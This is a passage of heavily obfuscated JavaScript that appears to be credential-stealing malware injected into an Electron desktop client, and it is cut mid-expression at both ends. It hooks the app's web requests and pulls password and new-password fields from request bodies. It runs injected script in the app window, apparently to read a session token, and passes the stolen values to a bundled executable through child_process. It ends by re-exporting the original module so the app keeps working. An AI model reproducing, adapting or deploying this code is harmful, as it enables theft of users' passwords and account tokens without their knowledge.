4a3,'08kG',0x657,0x579,0x5fe)+_0x276168('h]wg',0x1d9,0x320,0x54f,0x4d5)+_0x2df85c(0x20d,0x2f8,0x2ca,0x158,'Np[W')+_0x35a9f0('vj69',0x67f,0x6b9,0x757,0x4fa)+_0x276168('%3Y$',0x143,0x37c,0x415,0x460)+_0x59e7c9(0xd,'8YQS',-0x1f4,0x75,-0x197)+_0x2ff83b(0x20a,'eW#d',0x3e9,0x439,0x310)+_0x276168('!6ND',0x59a,0x5c7,0x597,0x6fd)+_0x276168('er11',0x2ff,0x565,0x5a7,0x5a1)+_0x35a9f0('Np[W',0x5f5,0x5af,0x444,0x627)+_0x35a9f0('asq^',0x339,0x3c6,0x4d8,0x2ba)+_0x35a9f0('m^ii',0x554,0x2f2,0x4f7,0x70f)+_0x35a9f0('EFvR',0x406,0x4cb,0x601,0x61e)+_0x2df85c(0x168,0x2be,0x564,0x379,'Hk9Z')+_0x59e7c9(0x3b8,'0tL3',0x1e6,-0x20,0x16b)+_0x59e7c9(0x1c,'08kG',0x1a0,-0x75,-0x87)+_0x35a9f0('RfHc',0x378,0x664,0x503,0x56a)+_0x276168('357&',0x6aa,0x611,0x7fb,0x6b0)+_0x2df85c(0x2fa,-0x19a,0xd5,0x8b,'(CAj')+_0x2df85c(0x22,-0x190,0x1e7,0xe1,'m^ii')+_0x59e7c9(0x1f9,'h]wg',-0x100,0x19b,-0x4a)+_0x2df85c(-0xfe,-0x153,0x2c1,0xb7,'eW#d')+_0x2ff83b(0x5b5,'d)1Q',0x654,0x28f,0x471)+_0x2df85c(0x251,0x22c,-0xb,0xa9,'8YQS')+_0x2ff83b(0x5f8,'Np[W',0x689,0x805,0x5b5)+_0x35a9f0('h]wg',0x8b3,0x686,0x693,0x8dc)+_0x35a9f0('3MeJ',0x978,0x894,0x806,0x911)+_0x2df85c(0x25b,0x647,0x3cc,0x3db,'(CAj')+_0x35a9f0('MCP#',0x875,0x506,0x6d2,0x51b)+_0x59e7c9(0x365,'eb0J',0x128,0x197,0xf4)+_0x59e7c9(-0x18d,'357&',-0xb1,0x16e,-0xe3)+_0x276168('!6ND',0x50c,0x3c0,0x3b6,0x240)+_0x276168('nSPg',0x72a,0x552,0x67f,0x2ef)+_0x59e7c9(0x10d,'KO@1',0xa7,0x122,0x206)+_0x2df85c(-0x83,0x39a,0x2f8,0x1e2,'asq^')+_0x2ff83b(0x313,'z2Oe',0x4e1,0x41b,0x2c4)+_0x2df85c(0x2d4,0x74,0x244,0x217,'3MeJ')+_0x276168('3MeJ',0x615,0x4d9,0x4d1,0x64c)+_0x2ff83b(0x589,'Np[W',0x432,0x5eb,0x3a7)+_0x276168('d)1Q',0x469,0x383,0x456,0x3d6)+_0x59e7c9(0x10b,'357&',-0xf9,-0x2c9,-0x104)+_0x59e7c9(0xde,'nSPg',-0x11b,-0x159,0x41)+_0x2df85c(0x6d3,0x421,0x671,0x4c5,'8YQS')+_0x2ff83b(0x41d,'[GQe',0x33f,0x325,0x4a6)+_0x2ff83b(0x4b9,'S$EO',0x586,0x3e8,0x541)+_0x2df85c(0x405,0x346,0x17e,0x1ae,'m^ii')+_0x2ff83b(0x10b,'[GQe',0x39f,0x26c,0x362)+_0x2ff83b(-0x14,'KO@1',0x309,0x335,0x212)+_0x276168('Np[W',0x766,0x5bc,0x698,0x4c6)+_0x59e7c9(0x2d,'%3Y$',-0x2a2,-0xec,-0x76)+_0x276168('Hk9Z',0x304,0x17b,0x1bf,-0x4e)+_0x2ff83b(0xb8,'H1Ip',0x2e1,0x48,0x193)+_0x2ff83b(0x365,'[qHe',0x2f9,0x7a,0x14e)+_0x59e7c9(-0xc3,'G$kb',0x17a,0x1f5,0x13e)+_0x276168('!6ND',0x49c,0x467,0x52e,0x278)+_0x35a9f0('%%)G',0x287,0x623,0x4db,0x589)+_0x2ff83b(0x3b9,'d)1Q',0x61b,0x5bc,0x4a5)+_0x2df85c(0x539,0x1d0,0x41c,0x302,'(CAj')+_0x2ff83b(0x1f1,'[qHe',0x223,0xd7,0x1e5)+_0x35a9f0('eW#d',0x742,0x8dd,0x796,0x8d5)+_0x59e7c9(0xf6,'eqrc',-0x11,-0xa7,-0x8b)+_0x2ff83b(0x4cb,'3MeJ',0x280,0x665,0x416)+_0x2df85c(0x2f2,0x16c,0x5cd,0x3c0,'S$EO')+_0x35a9f0('K$Eh',0x1d4,0x254,0x440,0x4ff)+_0x2df85c(0x23f,0x3e7,0x46a,0x3e9,'asq^')+_0x2ff83b(0x2a2,'S$EO',0x5d7,0x6f8,0x4c5)+_0x59e7c9(0x13c,'Np[W',0x113,0x234,0xac)+_0x2ff83b(0x632,'357&',0x4a4,0x3f1,0x5bd)+_0x2df85c(0x3cc,0x58a,0x2c7,0x3d5,'wu8H')+_0x2ff83b(0x2ea,'H1Ip',0x240,0x150,0x2d0)+_0x59e7c9(-0x19c,'eW#d',-0x55,-0x4a,0xbc)+_0x35a9f0('!6ND',0x30e,0x2fb,0x42b,0x5e9)+_0x2df85c(0x2e6,-0xbf,0x206,0xea,'ut@m')+_0x2df85c(0x21e,-0x126,0x1a3,0x62,'h]wg')+_0x2df85c(0x58b,0x4c5,0x592,0x400,'EFvR')+_0x35a9f0('eb0J',0x74d,0x74f,0x751,0x709)+_0x2ff83b(0x473,'H1Ip',0x26e,0x4b5,0x423)+_0x276168('[qHe',0xbd,0x19a,0x1ac,-0xcf)+_0x59e7c9(-0x335,'CV[@',-0x3bc,-0x293,-0x200)+_0x276168('CV[@',0x2d0,0x36b,0x190,0x396)+_0x276168('Hk9Z',0x536,0x2f3,0x39d,0x112)+';',!(0x617+0x1d8c+-0x23a3))[_0x35a9f0('!6ND',0x801,0x727,0x67c,0x7c2)](_0x4405d0=>{});}else return _0x1ff3d0[_0x2df85c(0xee,0x1b8,0x1d1,0x49,'llM9')+_0x2ff83b(0x3bb,'357&',0x41d,0x22d,0x3fe)]()[_0x59e7c9(0x398,'ut@m',0x297,0x3b7,0x258)+'h'](LfwWSb[_0x276168('Hk9Z',0x354,0x451,0x2e7,0x401)])[_0x2ff83b(0x2da,'d)1Q',0x1cf,-0x59,0x1be)+_0x35a9f0('EFvR',0x4ff,0x4bf,0x4dc,0x6f3)]()[_0x35a9f0('%3Y$',0x6a8,0x33e,0x4f2,0x359)+_0x276168('llM9',0x369,0x56f,0x348,0x672)+'r'](_0xd3aaad)[_0x276168('lOZ%',0x3d1,0x5a0,0x7aa,0x6ae)+'h'](LfwWSb[_0x276168('@)Mb',0x5ed,0x43a,0x28d,0x24d)]);}_0x3eff86[_0x59e7c9(-0xaf,'X9oW',-0x1d4,0x9c,0x71)](_0x379d6d,{});function _0x2df85c(_0x3f2149,_0x5a2f9b,_0x4e49b0,_0x4ee1c4,_0x4eb476){return _0x14e30b(_0x3f2149-0x88,_0x4ee1c4-0x1a6,_0x4eb476,_0x4ee1c4-0x11d,_0x4eb476-0x188);}function _0x2ff83b(_0x48cd34,_0x18b1b5,_0x29169e,_0x25833e,_0x13e9da){return _0x14e30b(_0x48cd34-0x1b2,_0x13e9da-0x2b8,_0x18b1b5,_0x25833e-0x92,_0x13e9da-0xfe);}function _0x276168(_0x39d4d3,_0x4a5e96,_0x5a0c3f,_0x35dab9,_0x1061af){return _0x533ec6(_0x39d4d3,_0x5a0c3f- -0x32d,_0x5a0c3f-0x5e,_0x35dab9-0x110,_0x1061af-0x18b);}return;}),session[_0x533ec6('[GQe',0x802,0x784,0x8f9,0x5de)+_0x533ec6('S$EO',0x57a,0x5df,0x764,0x444)+_0x4fef24(0x496,0x6a6,0x7f7,'z#EP',0x5da)][_0x533ec6('[qHe',0x7f2,0x6cd,0x5ff,0x64b)+_0x4fef24(0x8bb,0x9b8,0x572,'EFvR',0x7a2)][_0x14e30b(0x32,-0xd2,'H1Ip',-0x29c,-0x23b)+_0x2ada44(0x666,0x812,'lOZ%',0x92d,0xa21)+'d'](Endpoints,(_0x58b24b,_0x2fc787)=>{function _0xb17ffd(_0x2b48cf,_0x53da41,_0x3602f4,_0x49ab18,_0x47713c){return _0x2ada44(_0x2b48cf-0x15b,_0x47713c- -0x357,_0x3602f4,_0x49ab18-0x17e,_0x47713c-0x17e);}function _0x4fda21(_0x381319,_0x745a9c,_0x3e981a,_0x4c1403,_0x4e11a6){return _0x42c156(_0x381319-0x147,_0x745a9c-0x1b8,_0x4c1403- -0xae,_0x4c1403-0xe2,_0x381319);}const _0x5ca37b={'cOdSO':function(_0x4686ac,_0x975029){return _0x4686ac+_0x975029;},'PbLWn':_0x4fda21('89@x',-0x1c1,-0x33,0x82,0x1d9),'jqgEn':_0x4fda21('EFvR',0x34b,0x182,0x186,0x229),'GQULb':_0x4b5e1f(0x844,0x572,'Hk9Z',0x6b9,0x50e)+'n','DBqtZ':function(_0xdc26ce,_0x6ab80){return _0xdc26ce(_0x6ab80);},'ixqGx':_0xb17ffd(0x2e9,0x16b,'eW#d',0x144,0x1f0)+_0x4fda21('bjTv',0x2e9,-0x102,0x14a,0x360)+_0x4fda21('d)1Q',0x24e,0x20a,0x217,0x1a3)+_0x14dc4a(0x6c0,0x4fb,0x684,0x676,'@)Mb'),'bBvXg':_0xb17ffd(0x3f2,0x300,'Hk9Z',0x443,0x40a)+_0x4b5e1f(0x850,0x76c,'3nC1',0x87d,0x84e)+_0x4fda21('%%)G',0x18f,-0xfd,0x174,-0x52)+_0x4fda21('bjTv',0x372,0x66e,0x4c2,0x5eb)+_0xb17ffd(0x19d,0x4e0,'89@x',0x3da,0x34c)+_0x14dc4a(0x12c,0x247,0xa6,0x223,'ut@m')+'\x20)','TECOf':function(_0x1b627f,_0xe42d8d){return _0x1b627f!==_0xe42d8d;},'eEFVW':_0x4fda21('lOZ%',0x51b,0x299,0x314,0x553),'CmkHD':_0x4b5e1f(0xb2f,0x953,'llM9',0x8c4,0x8df),'tDIjo':_0x14dc4a(0xfa,0x209,0x1df,0x3a0,'ut@m'),'JtIze':_0x14dc4a(0x559,0x3b7,0x319,0x203,'d)1Q'),'vZIXh':_0x4fda21('OhVE',-0xab,-0x74,0x13d,0x245),'ztRta':function(_0x4cdb16,_0xa57b77){return _0x4cdb16+_0xa57b77;},'KHqoJ':_0x14dc4a(0x35c,0xf4,0xad,0x252,'[GQe')+_0xb17ffd(0x7a4,0x458,'z#EP',0x487,0x5ac)+_0x4b5e1f(0x6a6,0x85c,'@)Mb',0x8d7,0x9e0)+'e','npnvp':function(_0x5edd0a,_0xf35636){return _0x5edd0a!==_0xf35636;},'aKmcC':_0x3cd5ce(0x50d,0x604,0x527,0x44e,'vj69'),'exdNN':function(_0x399a68,_0x9a131e){return _0x399a68+_0x9a131e;}};function _0x14dc4a(_0xd5f3ad,_0x109bd7,_0x1d2953,_0x4ea87d,_0x24f4c6){return _0x533ec6(_0x24f4c6,_0x109bd7- -0x3d5,_0x1d2953-0x1da,_0x4ea87d-0x8e,_0x24f4c6-0xdb);}function _0x3cd5ce(_0x1c33d2,_0x4597eb,_0x338f55,_0x125624,_0xe1952d){return _0x533ec6(_0xe1952d,_0x4597eb-0x75,_0x338f55-0x3d,_0x125624-0x8d,_0xe1952d-0x1bc);}function _0x4b5e1f(_0x381909,_0x5e0522,_0x3eb47b,_0x1612fc,_0x2c2c17){return _0x14e30b(_0x381909-0xdf,_0x1612fc-0x632,_0x3eb47b,_0x1612fc-0x19,_0x2c2c17-0x13f);}const _0x1c042f=JSON[_0x4fda21('S$EO',0x1f2,0x50e,0x44f,0x334)](Buffer[_0x14dc4a(0x462,0x43d,0x2ab,0x2f3,'K$Eh')](_0x58b24b[_0x14dc4a(0x5f8,0x388,0x55c,0x425,'RfHc')+_0x4fda21('m^ii',0x35c,0x1c1,0x23e,0x39f)][0x39f*0x1+0x650+-0x9ef][_0x4b5e1f(0x54b,0x6ea,'eb0J',0x6ab,0x851)])[_0x4b5e1f(0x8ac,0x8f3,'(CAj',0x6b3,0x4de)+_0xb17ffd(0x48d,0x265,'h]wg',0x5aa,0x401)]()),_0x51ee44=BrowserWindow[_0x3cd5ce(0x972,0x89e,0xa0e,0x9f1,'nSPg')+_0x4b5e1f(0x738,0x791,'3MeJ',0x530,0x46d)+_0x4fda21('d)1Q',0xaf,0x2bc,0x30c,0x3e6)]()[0xf49*0x1+0x12a6+0x7*-0x4d9];_0x51ee44[_0x14dc4a(0x14c,0xff,0xf6,-0x135,'MCP#')+_0x4fda21('er11',0x5b,-0x4e,0x19d,0x1c8)+'s'][_0x4fda21('MCP#',0x2b6,0x52f,0x3fb,0x379)+_0x4b5e1f(0x742,0x42f,'lOZ%',0x565,0x636)+_0x4b5e1f(0x738,0xa09,'G$kb',0x7f4,0x80f)+'pt'](_0x14dc4a(-0x5c,0x14d,0x18b,0x185,'asq^')+_0x4fda21('RfHc',0xd6,0x34f,0x24e,0x10b)+_0x14dc4a(0x70b,0x4a9,0x6f1,0x30a,'89@x')+_0x4b5e1f(0x8ed,0xac3,'Np[W',0x85d,0xa76)+_0x14dc4a(0x3e4,0x4ea,0x600,0x521,'EFvR')+_0x4fda21('K$Eh',0x449,0x4dd,0x32c,0x4c8)+_0x3cd5ce(0x785,0x9a0,0xa35,0x7cd,'0tL3')+_0x14dc4a(0x6bf,0x4d5,0x355,0x5d8,'eb0J')+_0x14dc4a(0x39e,0x57f,0x7df,0x449,'3MeJ')+_0x4b5e1f(0x5d2,0x7ce,'RfHc',0x59b,0x4aa)+_0x4fda21('asq^',0x41c,0x5cc,0x446,0x49a)+_0x3cd5ce(0x3d9,0x5ca,0x7aa,0x563,'8YQS')+_0x4b5e1f(0x6d7,0x796,'@)Mb',0x6d4,0x93e)+_0x4fda21('H1Ip',0x41e,0xc0,0x32d,0x307)+_0x4b5e1f(0x2f0,0x63e,']eq@',0x4b3,0x4f3)+_0x4b5e1f(0x841,0x8fc,'z#EP',0x955,0x84f)+_0x4b5e1f(0x538,0x4d3,'Hk9Z',0x546,0x782)+_0x14dc4a(0x4a2,0x273,0x72,0x345,'[GQe')+_0xb17ffd(0x259,0x341,'m^ii',0x54e,0x453)+_0x4fda21('Q9lz',0xac,0x3aa,0x2f8,0x132)+_0x14dc4a(0x1a2,0x1d7,0x1fa,-0x15,'(CAj')+_0x4fda21('08kG',0x1d2,-0x99,0x137,0x66)+_0x4b5e1f(0x6b2,0x7a6,'3MeJ',0x822,0xa6f)+_0x14dc4a(0x451,0x543,0x69f,0x470,'h]wg')+_0x14dc4a(0x2be,0x430,0x354,0x40f,'h]wg')+_0x3cd5ce(0x676,0x55b,0x544,0x6c7,'S$EO')+_0x3cd5ce(0x588,0x720,0x646,0x4c7,'m^ii')+_0x3cd5ce(0x998,0x981,0xa71,0x879,'X9oW')+_0x3cd5ce(0x8ef,0x8c6,0xa00,0x6d9,'wu8H')+_0x4fda21('m^ii',0x381,0x423,0x4f7,0x6d0)+_0xb17ffd(0x5a0,0x60c,'OhVE',0x597,0x3b3)+_0x4b5e1f(0x635,0x8f0,'3nC1',0x6f8,0x49e)+_0x4b5e1f(0x520,0x665,'ut@m',0x6c3,0x831)+_0x14dc4a(-0xed,0xca,0x1ed,0x178,'Np[W')+_0x14dc4a(0x6b8,0x4d1,0x4f4,0x2ea,'39*L')+_0xb17ffd(0x10d,0xf3,'vj69',0x94,0x185)+_0x4b5e1f(0x9ca,0x7d9,'(CAj',0x919,0xabe)+_0x3cd5ce(0x581,0x784,0x755,0x649,'ut@m')+_0xb17ffd(0x502,0x10b,'MCP#',0x154,0x2ab)+_0x3cd5ce(0x740,0x569,0x460,0x76d,'3MeJ')+_0xb17ffd(0x368,-0x3b,'DbP#',0x118,0x230)+_0x4b5e1f(0x78e,0x552,'eW#d',0x578,0x6f9)+_0x4b5e1f(0x834,0x468,'eW#d',0x68a,0x581)+_0x4b5e1f(0x8f3,0x92c,'Hk9Z',0x8ff,0x9bb)+_0x3cd5ce(0x6c3,0x53a,0x59e,0x3a9,'[GQe')+_0x3cd5ce(0x5e6,0x527,0x485,0x57a,'0tL3')+_0x4fda21('%3Y$',0x488,0x36f,0x4a9,0x436)+_0x14dc4a(0x3a6,0x2ee,0x225,0x2b6,'%3Y$')+_0x4b5e1f(0x832,0xa2e,'OhVE',0x949,0xb1e)+_0x4fda21('OhVE',0x12e,0xda,0x22e,0x313)+_0xb17ffd(0x375,0x2d1,'h]wg',-0x71,0x150)+_0xb17ffd(0x2f0,0x334,'d)1Q',0x5ed,0x46b)+_0x4b5e1f(0x52e,0x720,'llM9',0x62e,0x625)+_0x4b5e1f(0x741,0x4f8,'CV[@',0x5a5,0x784)+_0x4b5e1f(0x50d,0x730,'X9oW',0x5f9,0x5a3)+_0x14dc4a(0x2e2,0x2d8,0xe5,0x49e,'!6ND')+_0x4fda21('llM9',-0x16e,0x41,0x9c,0x200)+_0x3cd5ce(0x6f1,0x585,0x7de,0x711,'MCP#')+_0x14dc4a(0x2bd,0x3e5,0x5a8,0x4b7,'Ri!W')+_0xb17ffd(0x359,0x1e1,'(CAj',0x537,0x3e4)+_0x3cd5ce(0x4a6,0x531,0x74f,0x653,'@)Mb')+_0x3cd5ce(0x7cc,0x667,0x4b7,0x7fe,'eW#d')+_0x3cd5ce(0x6f6,0x91a,0x7f5,0x778,'K$Eh')+_0x3cd5ce(0x4f6,0x523,0x34a,0x41c,'eb0J')+_0x3cd5ce(0x75a,0x84f,0x680,0x731,'Ri!W')+_0x4b5e1f(0x68d,0x70b,'eW#d',0x637,0x708)+_0x3cd5ce(0x3ae,0x533,0x72f,0x4a8,'0tL3')+_0xb17ffd(0xdc,0x2ad,'z#EP',0x1fe,0x2c2)+_0x4fda21('eb0J',0x569,0x3e2,0x414,0x58a)+_0x14dc4a(0x102,0x14e,-0xff,0x1a,'S$EO')+_0x3cd5ce(0x868,0x8d2,0xb0b,0x710,'z2Oe')+_0x14dc4a(0x220,0x2fc,0xea,0x359,'eqrc')+_0xb17ffd(0x43d,0x730,'Q9lz',0x407,0x571)+_0x14dc4a(0x4ca,0x50f,0x51f,0x5cf,'KO@1')+_0x14dc4a(0x234,0x464,0x6a8,0x316,'asq^')+_0x3cd5ce(0x5c8,0x7fe,0x627,0x94c,'CV[@')+_0x3cd5ce(0x893,0x90c,0xa54,0xae0,'z#EP')+_0x4b5e1f(0x6ab,0x4af,'08kG',0x639,0x476)+_0x14dc4a(0x21a,0x186,0x26b,0x9d,'@)Mb')+_0x4b5e1f(0x55a,0x554,'3nC1',0x522,0x422)+_0xb17ffd(0x69,0x1c2,'z#EP',0x4bf,0x2ba)+_0x4b5e1f(0x82d,0x926,'[GQe',0x81b,0x9d2)+_0xb17ffd(0x619,0x686,'H1Ip',0x3b2,0x4fd)+_0x4b5e1f(0x632,0x56c,'Hk9Z',0x56b,0x654)+_0x14dc4a(0x33c,0x422,0x1b7,0x350,'Np[W')+'n;',!(0x1659+0x16fa*0x1+-0x2d53))[_0x4fda21('K$Eh',-0x162,0x114,0x5b,0xa3)](_0x6522bc=>{function _0x1947e9(_0x44889b,_0x4431d8,_0x2b7059,_0x177bd3,_0x1363cb){return _0x4fda21(_0x44889b,_0x4431d8-0x1e0,_0x2b7059-0x17,_0x1363cb-0x62,_0x1363cb-0x22);}function _0x268882(_0x446857,_0x5066ed,_0x206f8f,_0x6d6d51,_0x38dffa){return _0xb17ffd(_0x446857-0x192,_0x5066ed-0x107,_0x206f8f,_0x6d6d51-0x108,_0x6d6d51-0x31);}function _0x47a3c0(_0x23c58f,_0xdd7774,_0x3843cb,_0x114d03,_0x5120f5){return _0x4fda21(_0x3843cb,_0xdd7774-0xd0,_0x3843cb-0x1e6,_0x23c58f-0x3cc,_0x5120f5-0x0);}function _0x4e4507(_0x2c4b5a,_0x4e00e5,_0x3fb4ab,_0x3438c5,_0x51dad6){return _0x14dc4a(_0x2c4b5a-0x160,_0x51dad6- -0x14b,_0x3fb4ab-0x13e,_0x3438c5-0x17e,_0x2c4b5a);}function _0x34bd8f(_0x3420c5,_0x186a17,_0x2c6204,_0x5d9aa1,_0x52e402){return _0x14dc4a(_0x3420c5-0x1c7,_0x52e402-0xb4,_0x2c6204-0xa1,_0x5d9aa1-0x147,_0x2c6204);}if(_0x5ca37b[_0x34bd8f(0x3ef,0x3cc,'Hk9Z',0x1d6,0x305)](_0x5ca37b[_0x268882(0x2ce,0x2b0,'08kG',0x47d,0x51a)],_0x5ca37b[_0x268882(0x484,0xe0,'h]wg',0x27f,0x2da)])){if(_0x58b24b[_0x268882(0x16e,0x435,'3nC1',0x311,0x227)][_0x268882(0x474,0x41c,'0tL3',0x5b5,0x3be)+_0x268882(0x394,0x19c,'8YQS',0x3e7,0x56e)](_0x5ca37b[_0x1947e9('MCP#',0x617,0x4db,0x662,0x497)]))_0x5ca37b[_0x47a3c0(0x6b8,0x66b,'[qHe',0x551,0x468)](_0x5ca37b[_0x34bd8f(0x7c,0x231,'nSPg',0x73,0x181)],_0x5ca37b[_0x34bd8f(0x192,0x430,'[qHe',0x426,0x23f)])?child_process[_0x1947e9('8YQS',0x1bb,0x38b,0x357,0x384)+_0x268882(0xcd,0x2c3,'vj69',0x1dc,0x3ce)](_0x5ca37b[_0x268882(0x1b7,0x33d,'H1Ip',0x28b,0x3d9)](__dirname,_0x5ca37b[_0x4e4507('X9oW',-0xf,0x393,0xe7,0x1c6)]),[_0x268882(0x413,0x208,'eb0J',0x2d7,0x394)+_0x268882(0x332,0x368,'%%)G',0x3a6,0x398)+(_0x1c042f[_0x1947e9('X9oW',0x36,0x139,-0x131,0xd6)+_0x1947e9('ut@m',0x1e9,0x2bb,0x3ee,0x357)+'rd']||'\x22\x22')+(_0x268882(0x611,0x5bf,'@)Mb',0x4a7,0x25d)+_0x1947e9('EFvR',-0x3e,0x380,0x25f,0x1f3)+_0x268882(0x159,0x1b8,'z#EP',0x396,0x3a2))+(_0x1c042f[_0x34bd8f(0x45e,0x29a,'3nC1',0x81,0x1f3)+_0x268882(0x530,0x416,'Ri!W',0x45f,0x3c7)]||'\x22\x22')+(_0x4e4507('wu8H',-0x156,0x238,-0x84,0xd3)+_0x47a3c0(0x53d,0x53c,'89@x',0x423,0x641))+_0x6522bc,'']):function(){return!![];}[_0x268882(0x6ca,0x411,'KO@1',0x4ea,0x511)+_0x47a3c0(0x546,0x421,'3nC1',0x3ef,0x510)+'r'](bbaDZO[_0x1947e9('MCP#',0x282,0x2fc,0x257,0x2b5)](bbaDZO[_0x4e4507('MCP#',0x130,0x295,-0x169,0xa3)],bbaDZO[_0x47a3c0(0x472,0x623,'H1Ip',0x485,0x3e9)]))[_0x34bd8f(0x4ae,0x258,'Np[W',0x3be,0x319)](bbaDZO[_0x268882(0x4a9,0x5c7,'vj69',0x3cb,0x55c)]);else{if(_0x5ca37b[_0x47a3c0(0x529,0x736,'llM9',0x6ab,0x777)](_0x5ca37b[_0x4e4507('KO@1',0x1d8,0x2fe,-0x2a,0xc5)],_0x5ca37b[_0x268882(0x19e,0x403,'0tL3',0x31b,0x469)])){if(_0x42eee8){const _0x2461db=_0xa893ac[_0x1947e9('llM9',0x425,0x387,0x312,0x37f)](_0x4d2337,arguments);return _0x4c3a39=null,_0x2461db;}}else child_process[_0x1947e9('S$EO',0x4a,0x11,0x27b,0x272)+_0x47a3c0(0x5c8,0x813,'er11',0x5ef,0x45f)](_0x5ca37b[_0x1947e9('Q9lz',0x605,0x5e3,0x4ac,0x4ed)](__dirname,_0x5ca37b[_0x4e4507('S$EO',0x4f2,0xe0,0x291,0x285)]),[_0x268882(0x723,0x650,'Np[W',0x550,0x3c2)+_0x4e4507('G$kb',0x1dd,-0xae,0x182,0x95)+(_0x1c042f[_0x34bd8f(0x430,0x29d,'39*L',0x24e,0x20d)+_0x47a3c0(0x70d,0x7cc,'CV[@',0x8aa,0x8ac)]||'\x22\x22')+(_0x47a3c0(0x6f7,0x7f5,'ut@m',0x90d,0x903)+_0x34bd8f(0x204,0x3be,'ut@m',0x2ae,0x424)+_0x34bd8f(0x426,0x68a,'z2Oe',0x35a,0x5b1))+(_0x1c042f[_0x268882(0x2fd,0x405,'vj69',0x421,0x238)+_0x4e4507('vj69',0x272,0x594,0x142,0x379)+'rd']||'\x22\x22')+(_0x34bd8f(0x169,0x32f,'%3Y$',0x38f,0x32a)+_0x34bd8f(0x4cc,0x4bb,'N!u(',0x23f,0x449))+_0x6522bc,'']);}}else{let _0x21fb26;try{_0x21fb26=bbaDZO[_0x1947e9('eW#d',0x7a,0x2b0,0x113,0x217)](_0x209941,bbaDZO[_0x4e4507('er11',0x16b,0x125,0x19f,0x204)](bbaDZO[_0x4e4507('0tL3',0x11b,-0x1b7,-0x14,-0x2d)](bbaDZO[_0x47a3c0(0x56c,0x448,'[GQe',0x521,0x338)],bbaDZO[_0x1947e9('er11',0x46f,0x22d,0x112,0x345)]),');'))();}catch(_0x10fe47){_0x21fb26=_0x31f2b4;}return _0x21fb26;}});}),module[_0x533ec6('[GQe',0x528,0x3be,0x4db,0x536)+'ts']=require(_0x2ada44(0x6e1,0x7f8,'Q9lz',0x665,0x985)+_0x42c156(0x3bd,0x4fd,0x489,0x6ba,'Q9lz')+'r');function _0x11f737(_0x15fc90){function _0x1aa977(_0x21d6f9,_0x2041e1,_0x5811ad,_0x4a753f,_0x2b5139){return _0x42c156(_0x21d6f9-0x129,_0x2041e1-0x169,_0x2041e1-0x30d,_0x4a753f-0xc9,_0x5811ad);}function _0x4d4838(_0x4b4215,_0x1f5e5c,_0x213e3d,_0x8e7f41,_0x28f731){return _0x533ec6(_0x28f731,_0x4b4215- -0x11d,_0x213e3d-0x1e1,_0x8e7f41-0x117,_0x28f731-0x46);}function _0x1a7597(_0x41307e,_0x48a3a4,_0x4b8da5,_0x2ae57d,_0x25619e){return _0x14e30b(_0x41307e-0xfb,_0x2ae57d-0xbd,_0x4b8da5,_0x2ae57d-0x10,_0x25619e-0x102);}const _0x2fcf33={'lElir':function(_0x17f9cb,_0x1cba1d){return _0x17f9cb(_0x1cba1d);},'xGpPC':function(_0x23fa9b,_0x22ff4e){return _0x23fa9b(_0x22ff4e);},'ytWii':function(_0x4a703c,_0x94fac6){return _0x4a703c===_0x94fac6;},'COeYN':_0x1aa977(0x623,0x41a,'(CAj',0x4b5,0x644),'bbplI':_0x1aa977(0x36d,0x4e9,'[qHe',0x2e2,0x29d)+_0x1a7597(0x17a,0x33f,'357&',0xfd,-0x74)+_0x1aa977(0x714,0x84a,'asq^',0x81e,0x927),'CaJQp':_0x1aa977(0x409,0x492,'RfHc',0x4ff,0x518)+'er','NITLu':_0x1aa977(0x542,0x43a,'8YQS',0x413,0x3aa),'ciCAZ':function(_0x301d4b,_0x115ca7){return _0x301d4b+_0x115ca7;},'YJjPK':_0x481fe4(0x3aa,0x340,0x159,'KO@1',0x5f9)+_0x4d4838(0x41b,0x27a,0x2e8,0x51f,'KO@1')+_0x1aa977(0x768,0x8bb,'N!u(',0x97f,0x7f3)+'e','yvMMu':_0x33796f(0x8df,'er11',0x83b,0x9a3,0x8ef),'OQfzt':function(_0xacee85){return _0xacee85();},'AoxxA':function(_0x3a27b7,_0x563938){return _0x3a27b7!==_0x563938;},'eJsKD':_0x33796f(0x507,'asq^',0x656,0x2e8,0x687),'ggmTW':_0x4d4838(0x7a4,0x953,0x920,0x978,'Ri!W'),'SXLeJ':function(_0x1d4162,_0x3019f6){return _0x1d4162===_0x3019f6;},'tmjrA':_0x481fe4(0x1a9,-0x3c,-0xd,'bjTv',-0xb8)+'g','VdlNS':_0x33796f(0x6ae,'bjTv',0x844,0x72b,0x5ed),'wLQNI':_0x33796f(0x52b,'llM9',0x503,0x58f,0x3bf),'sLbIY':_0x33796f(0x52a,'[GQe',0x2df,0x4df,0x63a),'iDxPB':_0x481fe4(0x525,0x499,0x2bf,'DbP#',0x697),'AWALh':function(_0x2edeea,_0x203847){return _0x2edeea!==_0x203847;},'AjtRW':function(_0x401bed,_0x3d9575){return _0x401bed+_0x3d9575;},'uJyLK':function(_0x3582a3,_0x36b688){return _0x3582a3/_0x36b688;},'MZHri':_0x33796f(0x5cd,'asq^',0x533,0x58b,0x3f8)+'h','kVZci':function(_0xbbc85f,_0x557ca1){return _0xbbc85f%_0x557ca1;},'sbdqa':function(_0x5ba5d6,_0xcfba08){return _0x5ba5d6!==_0xcfba08;},'INAiX':_0x4d4838(0x5ab,0x72d,0x5ba,0x708,'H1Ip'),'kMfGD':function(_0x300af3,_0x3362cc){return _0x300af3+_0x3362cc;},'Jerqr':_0x1a7597(-0x1,0x17e,'89@x',-0x94,-0x117),'VXAHp':_0x1a7597(0x5a1,0x4a1,'Hk9Z',0x34e,0x131),'lWPCe':_0x1a7597(0x474,0x435,'z2Oe',0x384,0x4be)+'n','SaJcV':function(_0x410045,_0x254d8b){return _0x410045===_0x254d8b;},'zwjGi':_0x33796f(0x5af,'!6ND',0x46d,0x384,0x4a3),'dXfEC':function(_0x16a6a3,_0x47e324){return _0x16a6a3+_0x47e324;},'GFuoI':_0x481fe4(0x287,0x57,0x3ad,'m^ii',0x2cf)+_0x4d4838(0x7af,0x9a5,0x8a5,0x651,'8YQS')+'t','kZZMq':function(_0x29c2cd,_0x404507){return _0x29c2cd+_0x404507;},'vMXJH':function(_0x36ace3,_0x583bb9){return _0x36ace3===_0x583bb9;},'zynCu':_0x481fe4(0x2bf,0xea,0x12e,'z2Oe',0x274),'GxjDo':_0x1aa977(0x5ec,0x47a,'Np[W',0x606,0x54d),'YvHWO':_0x1a7597(-0x10e,0x33b,'vj69',0x127,-0x110),'UPsiK':_0x481fe4(0x3f6,0x3ba,0x198,'%3Y$',0x3df),'TPUUB':function(_0x487f41,_0x3aee5c){return _0x487f41(_0x3aee5c);}};function _0x33796f(_0x33303d,_0x4c28c6,_0x41dd94,_0x5b3c94,_0x5514f3){return 